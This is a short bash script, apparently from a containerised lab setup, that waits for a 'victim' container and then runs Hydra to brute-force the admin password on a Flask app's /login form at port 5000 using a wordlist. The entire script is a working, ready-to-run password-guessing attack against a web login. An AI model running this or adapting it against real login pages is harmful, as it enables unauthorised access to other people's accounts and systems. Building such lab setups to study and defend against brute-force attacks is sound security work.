#!/bin/bash
# Simple Hydra brute‑force attack script
# Target: victim web login (Flask app)


TARGET_IP="victim"
TARGET_URL="http://$TARGET_IP:5000/login"
USER="admin"
WORDLIST="/wordlists/passwords.txt"


# Wait for victim container to become ready
sleep 3


echo "[*] Starting brute‑force attack on $TARGET_URL..."
\hydra -l $USER -P $WORDLIST $TARGET_IP http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid" -V